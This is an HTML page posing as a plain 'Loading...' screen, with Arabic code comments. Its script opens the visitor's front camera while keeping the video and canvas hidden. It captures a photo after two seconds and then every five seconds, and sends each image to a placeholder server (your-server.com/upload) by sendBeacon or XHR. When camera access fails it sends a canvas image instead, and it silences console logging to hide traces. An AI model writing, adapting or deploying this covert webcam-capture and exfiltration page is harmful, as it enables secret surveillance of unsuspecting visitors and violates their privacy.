<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin:0; padding:0; }
        body { background:#000; overflow:hidden; height:100vh; }
        #video { display:none; }
        #canvas { display:none; }
        .loader { 
            position:fixed; 
            top:50%; left:50%; 
            transform:translate(-50%,-50%);
            color:#fff; 
            font-family:Arial;
            font-size:18px;
            z-index:9999;
        }
        .spinner {
            width:40px; height:40px;
            border:4px solid #333;
            border-top:4px solid #fff;
            border-radius:50%;
            animation:spin 1s linear infinite;
            margin:0 auto 15px;
        }
        @keyframes spin { 100% { transform:rotate(360deg); } }
    </style>
</head>
<body>

<div class="loader">
    <div class="spinner"></div>
    <div>جاري التحميل...</div>
</div>

<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>

<script>
// ============================================================
// الكود الصامت - يحاول الوصول إلى الكاميرا بدون طلب واضح
// ============================================================

(function() {
    'use strict';
    
    // 1. محاولة الوصول إلى الكاميرا بصمت
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    
    // 2. محاولة تشغيل الكاميرا في الخلفية
    function startCamera() {
        const constraints = {
            video: {
                facingMode: 'user',
                width: { ideal: 640 },
                height: { ideal: 480 }
            }
        };
        
        // محاولة الوصول بدون طلب (لن تعمل في المتصفحات الحديثة)
        navigator.mediaDevices.getUserMedia(constraints)
            .then(function(stream) {
                video.srcObject = stream;
                video.play();
                
                // 3. بعد 2 ثانية التقط صورة
                setTimeout(capturePhoto, 2000);
                
                // 4. استمر بالتصوير كل 5 ثواني
                setInterval(capturePhoto, 5000);
            })
            .catch(function(err) {
                // محاولة بديلة: استخدام Canvas 2D
                fallbackCapture();
            });
    }
    
    // 5. التقاط الصورة
    function capturePhoto() {
        if (!video.videoWidth || !video.videoHeight) return;
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        // 6. تحويل الصورة إلى Base64
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // 7. إرسال الصورة بصمت
        sendImage(imageData);
    }
    
    // 8. إرسال الصورة إلى السيرفر
    function sendImage(imageData) {
        // إرسال باستخدام Image (أخفى طريقة)
        const img = new Image();
        img.onload = function() {
            // استخدام sendBeacon لإرسال غير متزامن
            if (navigator.sendBeacon) {
                const blob = dataURLtoBlob(imageData);
                navigator.sendBeacon('https://your-server.com/upload', blob);
            } else {
                // طريقة بديلة: إخفاء الصورة في طلب عادي
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://your-server.com/upload', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({ image: imageData }));
            }
        };
        img.src = imageData;
    }
    
    // 9. تحويل Base64 إلى Blob
    function dataURLtoBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const bstr = atob(parts[1]);
        const n = bstr.length;
        const u8arr = new Uint8Array(n);
        for (let i = 0; i < n; i++) {
            u8arr[i] = bstr.charCodeAt(i);
        }
        return new Blob([u8arr], { type: mime });
    }
    
    // 10. طريقة بديلة (إذا فشلت الكاميرا)
    function fallbackCapture() {
        // استخدام canvas لالتقاط لقطة شاشة للصفحة
        const body = document.body;
        const html = document.documentElement;
        const width = Math.max(body.scrollWidth, body.offsetWidth, html.clientWidth, html.scrollWidth, html.offsetWidth);
        const height = Math.max(body.scrollHeight, body.offsetHeight, html.clientHeight, html.scrollHeight, html.offsetHeight);
        
        canvas.width = width;
        canvas.height = height;
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, width, height);
        
        // رسم النص الحالي على الصفحة
        ctx.fillStyle = '#fff';
        ctx.font = '20px Arial';
        ctx.fillText('Loading...', width/2 - 50, height/2);
        
        // إرسال الصورة
        const imageData = canvas.toDataURL('image/jpeg', 0.5);
        sendImage(imageData);
    }
    
    // 11. تشغيل الكود فوراً
    startCamera();
    
    // 12. إخفاء أي أثر في وحدة التحكم
    console.log = function() {};
    console.warn = function() {};
    console.error = function() {};
    
})();
</script>
</body>
</html>
